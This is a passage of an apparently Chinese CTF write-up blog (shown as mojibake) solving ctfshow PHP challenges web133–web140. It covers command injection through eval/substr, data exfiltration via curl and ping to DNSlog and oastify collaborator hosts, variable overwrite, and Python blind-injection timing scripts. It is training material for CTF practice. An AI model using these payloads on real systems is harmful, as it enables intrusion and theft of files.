å½“</strong>x<strong>ä¸º</strong>false<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y<strong>ï¼›<br>å¯¹äºâ€œæˆ–â€ï¼ˆ</strong>||<strong>ï¼‰ è¿ç®— ï¼š  <strong>x||y</strong> å½“</strong>x<strong>ä¸º</strong>true<strong>æ—¶ï¼Œç›´æ¥è·³è¿‡ï¼Œä¸æ‰§è¡Œ</strong>y**ã€‚</p><p>æ‰€ä»¥payloadï¼š<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substrç»•è¿‡-DNSlog-Collaborator-Client"><a href="#web133-substrç»•è¿‡-DNSlog-Collaborator-Client" class="headerlink" title="web133(substrç»•è¿‡ DNSlog Collaborator Client)"></a>web133(substrç»•è¿‡ DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>æˆ‘ä»¬ä¼ é€’?F&#x3D;<code>$F</code>;+sleep 3å¥½åƒç½‘ç«™ç¡®å®sleepäº†ä¸€ä¼šè¯´æ˜çš„ç¡®æ‰§è¡Œäº†å‘½ä»¤<br>é‚£ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ<br>å› ä¸ºæ˜¯æˆ‘ä»¬ä¼ é€’çš„<code>$F</code>;+sleep 3ã€‚å…ˆè¿›è¡Œsubstr()å‡½æ•°æˆªæ–­ç„¶åå»æ‰§è¡Œeval()å‡½æ•°<br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ‰§è¡Œphpä»£ç ï¼Œæ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™ï¼Œç„¶åå°±å»å‘½ä»¤æ‰§è¡Œã€‚<br>è€Œ$Få°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„<code>$F</code>;+sleep 3 ä½¿ç”¨æœ€åæ‰§è¡Œçš„ä»£ç åº”è¯¥æ˜¯<br><code>$F</code>;+sleep 3,å°±æ‰§è¡ŒæˆåŠŸ<br>è¿™é‡Œå¯èƒ½æœ‰ç‚¹ç»•ï¼Œæ…¢æ…¢ç†è§£</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" åªä¼šè¢«å±•å¼€ä¸€æ¬¡</span></code></pre><blockquote><p>åˆ©ç”¨<code>$F</code>;è®©evalæ‰§è¡Œshellè¯­å¥ã€‚<br>è¿™ä¸€ä¸²å­—ç¬¦é•¿åº¦æ˜¯5ï¼ŒåŠ ä¸ªç©ºæ ¼ï¼Œæ»¡è¶³substrçš„6ä¸ªå­—ç¬¦æˆªå–ï¼Œè®©evalæ‰§è¡Œ<code>$F</code>;</p><p>å¦‚ä¼ é€’<code>$F</code>;+sleep 3ï¼Œé¡µé¢ä¼šsleepä¸€ä¼šã€‚å…·ä½“æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(â€œ<code>$F</code>; â€œ);<br>&#x3D;&#x3D;&gt;php:   eval(â€œ&#96;&#96;$F<code>; sleep 3</code>; â€œ);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>æ‰€ä»¥å°±æ‰§è¡Œäº†sleep 3</p></blockquote><p>æ–¹æ³•ä¸€(DNSlogå¤–å¸¦)ï¼šï¼ˆæ²¡æˆåŠŸï¼‰</p><p><a href="http://www.dnslog.cn/">åœ¨çº¿DNSlog</a></p><p>å…ˆå¾—åˆ°ä¸€ä¸ªåŸŸåï¼Œç„¶ååˆ©ç”¨dnslogå®ç°å‘½ä»¤å›æ˜¾ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>å½“pingä¸€ä¸ªåŸŸåæ—¶ä¼šå¯¹å…¶è¿›è¡Œä¸€ä¸ªé€’å½’ DNS æŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½åœ¨åç«¯è·å–åˆ° DNS çš„æŸ¥è¯¢è¯·æ±‚ï¼Œå½“å‘½ä»¤çœŸæ­£è¢«æ‰§è¡Œä¸”å¹³å°æ”¶åˆ°å›æ˜¾æ—¶å°±èƒ½è¯´æ˜æ¼æ´ç¡®å®å­˜åœ¨ã€‚</p><p>flag.phpæ˜¯å¤šè¡Œï¼Œéœ€è¦grepä¸€ä¸‹ï¼Œå…¶æ¬¡ä¸èƒ½å«æœ‰ç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥trè®¾ç½®ä¸€ä¸‹è¿”å›ç»“æœåªæºå¸¦å­—æ¯å’Œæ•°å­—ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>æ–¹æ³•äºŒ( Collaborator Client Curl -F):</p><p>ä½¿ç”¨curl -Få‘½ä»¤ã€‚-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-å˜é‡è¦†ç›–"><a href="#web134-å˜é‡è¦†ç›–" class="headerlink" title="web134(å˜é‡è¦†ç›–)"></a>web134(å˜é‡è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>çœ‹åˆ°parse_strå’Œextractã€‚å˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’ã€‚</p><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ã€‚ä¾‹å¦‚ä¼ é€’?a&#x3D;1ï¼Œæ‰§è¡Œåå°±æ˜¯$a&#x3D;1ã€‚<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ é€’<code>_POST</code>ï¼Œå°±æ˜¯å¯¹<code>$_POST</code>è¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚<br>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p>payloadï¼š<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†è®¸å¤šå‘½ä»¤ï¼Œpingå¯ä»¥ç”¨ï¼Œè¯»å–å‘½ä»¤<code>nl</code>å¯ä»¥ç”¨ã€‚<br>grepè¢«é™åˆ¶äº†ï¼Œå¯ä»¥ç”¨awkæŒ‡å®šè¡Œå·è¾“å‡ºï¼Œä¸è¿‡éœ€è¦é€è¡Œæµ‹è¯•ï¼Œåœ¨15è¡Œæœ‰flagã€‚æˆ–è€…å‚è€ƒä¹‹å‰flagçš„æ ¼å¼ï¼Œä¹Ÿå¯ä»¥æ¨æµ‹å‡ºæ¥æ˜¯15ã€‚</p><p>è¿™ä¸ªé¢˜è¿˜æŠŠflagåˆ†æˆäº†ä¸¤ä¸ªï¼Œè¡Œå·15å’Œ16ï¼Œéœ€è¦æ‹¼æ¥ä¸€ä¸‹ã€‚</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>å‘ç°æ–°è§£æ³•ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>ç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><blockquote><p><a href="https://stackoverflow.com/questions/10534360/php-call-user-func-on-a-static-method">PHP call_user_func on a static method</a></p><pre class="language-none"><code class="language-none">$class &#x3D; &#39;\\MyBundleNamespace\\MyClass&#39;; $method &#x3D; &#39;myFunction&#39;;</code></pre><p>Both calls should work:</p><pre class="language-none"><code class="language-none">call_user_func(&quot;$class::$method&quot;); call_user_func(array($class, $method));</code></pre></blockquote><p>payload: <code>ctfshow=ctfshow::getFlag</code><br>payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h4 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h4><p>è¿‡æ»¤äº†::ä½†æ˜¯å¯ä»¥ç”¨æ•°ç»„</p><h4 id="web139-å‘½ä»¤ç›²æ³¨"><a href="#web139-å‘½ä»¤ç›²æ³¨" class="headerlink" title="web139(å‘½ä»¤ç›²æ³¨)"></a>web139(å‘½ä»¤ç›²æ³¨)</h4><p>ä½¿ç”¨teeå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ç›²æ³¨</p><p><strong>ls &#x2F;</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">'_~'</span>result<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#è¡Œ</span>    key<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#åˆ—</span>        <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token comment">#awk 'NR==&#123;0&#125;'é€è¡Œè¾“å‡ºè·å–</span>        <span class="token comment">#cut -c &#123;1&#125; æˆªå–å•ä¸ªå­—ç¬¦</span>            payload<span class="token operator">=</span><span class="token string">"if [ `ls /|awk 'NR==&#123;0&#125;'|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token comment">#print(payload)</span>            url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result<span class="token operator">=</span>result<span class="token operator">+</span>n                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> n<span class="token operator">==</span><span class="token string">'~'</span><span class="token punctuation">:</span>                key<span class="token operator">=</span><span class="token number">1</span>                result<span class="token operator">+=</span><span class="token string">" "</span></code></pre><p><strong>cat &#x2F;f149_15_h3r3</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token builtin">str</span><span class="token operator">=</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span><span class="token string">"-"</span>result<span class="token operator">=</span><span class="token string">""</span>key<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token keyword">if</span> key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>n<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        url<span class="token operator">=</span><span class="token string">"https://1ae58c7e-061c-418b-a2c8-0b4a1f452e3f.challenge.ctf.show/?c="</span><span class="token operator">+</span>payload        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>n            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web140-php-intval"><a href="#web140-php-intval" class="headerlink" title="web140(php &#x3D;&#x3D;  intval)"></a>web140(php &#x3D;&#x3D;  intval)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://blog.csdn.net/qq_47804678/article/details/128814377">phpæ¯”è¾ƒç»•è¿‡ï¼ˆå¼ºæ¯”è¾ƒâ€œ&#x3D;&#x3D;&#x3D;â€&#x2F;å¼±æ¯”è¾ƒâ€œ&#x3D;&#x3D;â€œï¼‰</a></p><p>å› 